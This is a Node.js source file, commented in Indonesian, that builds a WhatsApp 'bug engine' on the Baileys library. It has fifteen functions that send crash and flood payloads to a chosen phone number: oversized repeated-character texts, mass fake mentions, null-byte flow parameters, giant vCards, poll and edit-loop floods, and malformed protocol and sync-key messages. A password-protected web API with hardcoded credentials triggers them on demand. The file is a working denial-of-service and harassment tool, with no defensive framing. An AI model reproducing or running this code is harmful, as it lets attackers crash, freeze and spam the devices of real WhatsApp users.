const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const express = require("express");
const cors = require("cors");
const qrcode = require("qrcode-terminal");
const path = require("path");
const crypto = require("crypto");

const PORT = process.env.PORT || 1919;
const AUTH_USER = "kazix";
const AUTH_PASS = "1919";
const AUTH_TOKEN = crypto.createHash("sha256").update(AUTH_USER + ":" + AUTH_PASS).digest("hex");

let sock = null;
let latestQR = null;

function makeRepeater(ch, n) {
  let s = "";
  for (let i = 0; i < n; i++) s += ch;
  return s;
}

// ============ 15 FITUR BUG ============
const ENGINE = {
  BlankTagAll: async function(t) {
    const filler = makeRepeater("ꦽ", 50000);
    await sock.relayMessage(t, {
      extendedTextMessage: {
        text: filler,
        contextInfo: { mentionedJid: [t, "0@s.whatsapp.net"] }
      }
    }, { participant: { jid: t } });
  },
  MentionSniper: async function(t) {
    const jids = ["0@s.whatsapp.net"];
    for (let i = 0; i < 50000; i++) jids.push("1" + Math.floor(Math.random()*5000000) + "@s.whatsapp.net");
    await sock.relayMessage(t, {
      ephemeralMessage: { message: { interactiveMessage: {
        body: { text: "?" }, header: { title: "SNIPER", hasMediaAttachment: false },
        nativeFlowMessage: { messageParamsJson: "{}" },
        contextInfo: { participant: t, mentionedJid: jids }
      } } }
    }, { participant: { jid: t } });
  },
  CarouselBomb: async function(t) {
    const cards = [];
    for (let i = 0; i < 20; i++) cards.push({
      header: { title: "CARD_" + i, hasMediaAttachment: false },
      body: { text: "BODY_" + i },
      nativeFlowMessage: { messageParamsJson: makeRepeater("{", 10000) }
    });
    await sock.relayMessage(t, {
      viewOnceMessage: { message: { interactiveMessage: {
        body: { text: "CAROUSEL" }, carouselMessage: { cards: cards, messageVersion: 1 }
      } } }
    }, { participant: { jid: t } });
  },
  DelayFlow: async function(t) {
    await sock.relayMessage(t, {
      viewOnceMessage: { message: { interactiveResponseMessage: {
        body: { text: "FLOW", format: "DEFAULT" },
        nativeFlowResponseMessage: { name: "kz_bomb", paramsJson: makeRepeater("\u0000", 500000), version: 3 }
      } } }
    }, {});
  },
  VCardCrash: async function(t) {
    const name = makeRepeater("A", 100000);
    await sock.relayMessage(t, {
      contactsArrayMessage: { displayName: "KZ", contacts: [{
        displayName: name,
        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + name + "\nTEL;type=CELL;waid=" + t + "\nEND:VCARD"
      }] }
    }, {});
  },
  GroupJidSpam: async function(t) {
    for (let i = 0; i < 30; i++) await sock.relayMessage(t, {
      extendedTextMessage: { text: "SPAM_" + i + "_" + makeRepeater("X", 5000), contextInfo: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" } }
    }, { participant: { jid: t } });
  },
  PollBomb: async function(t) {
    const opts = [];
    for (let i = 0; i < 1000; i++) opts.push("OPTION_" + i + "_" + makeRepeater("Y", 100));
    await sock.relayMessage(t, { pollCreationMessageV3: { name: "KZ_POLL", options: opts.map(o => ({ optionName: o })), selectableOptionsCount: 1 } }, {});
  },
  ButtonSpam: async function(t) {
    const buttons = [];
    for (let i = 0; i < 50; i++) buttons.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "BTN_" + i, id: "btn_" + i }) });
    await sock.relayMessage(t, {
      viewOnceMessage: { message: { interactiveMessage: { body: { text: "BUTTONS" }, nativeFlowMessage: { buttons: buttons, messageParamsJson: "{}" } } } }
    }, { participant: { jid: t } });
  },
  EditLoop: async function(t) {
    const msg = await sock.relayMessage(t, { conversation: "EDIT_START" }, {});
    for (let i = 0; i < 500; i++) await sock.relayMessage(t, {
      protocolMessage: { key: { id: msg.key.id, remoteJid: t, fromMe: true }, type: 14, editedMessage: { conversation: "EDIT_" + i + "_" + makeRepeater("Z", 1000) }, timestampMs: Date.now() }
    }, {});
  },
  StatusBomb: async function(t) {
    const msg = await generateWAMessageFromContent(t, {
      imageMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/placeholder", mimetype: "image/jpeg", caption: makeRepeater("C", 200000), fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=", fileLength: 73247, height: 736, width: 736, mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=", fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=", directPath: "/o1/v/t24/f2/m238/placeholder", jpegThumbnail: null }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [t], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: t }, content: undefined }] }] }] });
  },
  ReactionCrash: async function(t) {
    await sock.relayMessage(t, { reactionMessage: { key: { remoteJid: t, fromMe: false, id: "stub", participant: t }, text: makeRepeater("😹", 50000), senderTimestampMs: Date.now() } }, {});
  },
  ProtocolKill: async function(t) {
    await sock.relayMessage(t, { protocolMessage: { key: { remoteJid: t, fromMe: false, id: "stub_" + Date.now(), participant: "0@s.whatsapp.net" }, type: 25, additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "KZ" }, content: undefined }] } }, {});
  },
  AlbumBomb: async function(t) {
    for (let i = 0; i < 30; i++) await sock.relayMessage(t, { imageMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/placeholder_" + i, mimetype: "image/jpeg", caption: "ALBUM_" + i, fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=", fileLength: 73247, height: 736, width: 736, mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=", fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=", directPath: "/o1/v/t24/f2/m238/placeholder_" + i, jpegThumbnail: null } }, {});
  },
  SyncKill: async function(t) {
    await sock.relayMessage(t, { protocolMessage: { key: { remoteJid: t, fromMe: false, id: "stub_" + Date.now() }, type: 5, appStateSyncKeyShare: { keys: [{ keyId: { keyId: makeRepeater("\u0000", 32) }, fingerprint: { rawId: Math.floor(Math.random()*999999), currentIndex: 0, deviceIndexes: [0, 1] }, timestamp: Date.now() }] } } }, {});
  },
  CombinedNuke: async function(t) {
    try { await ENGINE.BlankTagAll(t); } catch(e){}
    try { await ENGINE.CarouselBomb(t); } catch(e){}
    try { await ENGINE.ProtocolKill(t); } catch(e){}
    try { await ENGINE.ButtonSpam(t); } catch(e){}
  }
};

// ============ WEB SERVER ============
const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

function auth(req, res, next) {
  const t = req.headers["x-auth-token"] || req.query.token;
  if (t !== AUTH_TOKEN) return res.status(401).json({ ok: false, err: "unauthorized" });
  next();
}

app.post("/api/login", (req, res) => {
  const { user, pass } = req.body || {};
  if (user === AUTH_USER && pass === AUTH_PASS) return res.json({ ok: true, token: AUTH_TOKEN });
  res.status(401).json({ ok: false, err: "invalid creds" });
});

app.get("/api/status", auth, (req, res) => {
  res.json({ ok: true, connected: !!sock, funcs: Object.keys(ENGINE) });
});

app.post("/api/bug", auth, async (req, res) => {
  const { func, target } = req.body || {};
  if (!ENGINE[func]) return res.status(400).json({ ok: false, err: "unknown func" });
  if (!sock) return res.status(503).json({ ok: false, err: "wa not connected" });
  try {
    await ENGINE[func](target);
    res.json({ ok: true, func, target });
  } catch (e) {
    res.status(500).json({ ok: false, err: e.message });
  }
});

// Halaman QR untuk scan via browser
app.get("/qr", (req, res) => {
  if (sock && sock.user) return res.send("<h1>✅ WhatsApp sudah terhubung</h1>");
  if (!latestQR) return res.send("<h1>⏳ QR belum siap, tunggu 10 detik lalu refresh</h1>");
  res.send(`
    <html><body style="background:#000;color:#fff;text-align:center;font-family:sans-serif;padding:20px">
    <h1>Scan QR ini pakai WhatsApp</h1>
    <p>WhatsApp → Perangkat Tertaut → Tautkan Perangkat</p>
    <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(latestQR)}" />
    <p>Refresh halaman ini tiap 20 detik kalau QR expired</p>
    </body></html>
  `);
});

// ============ WHATSAPP ============
async function startWA() {
  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "auth"));
  const { version } = await fetchLatestBaileysVersion();
  sock = makeWASocket({
    version,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["KZ-BugEngine", "Chrome", "1.0.0"],
  });
  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("connection.update", (u) => {
    const { connection, lastDisconnect, qr } = u;
    if (qr) { latestQR = qr; console.log("[WA] QR ready — buka /qr di browser"); }
    if (connection === "close") {
      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) { console.log("[WA] Reconnect..."); startWA(); }
    } else if (connection === "open") {
      latestQR = null;
      console.log("[WA] ✅ Connected");
    }
  });
}

app.listen(PORT, () => {
  console.log("[SRV] port " + PORT);
  startWA();
});
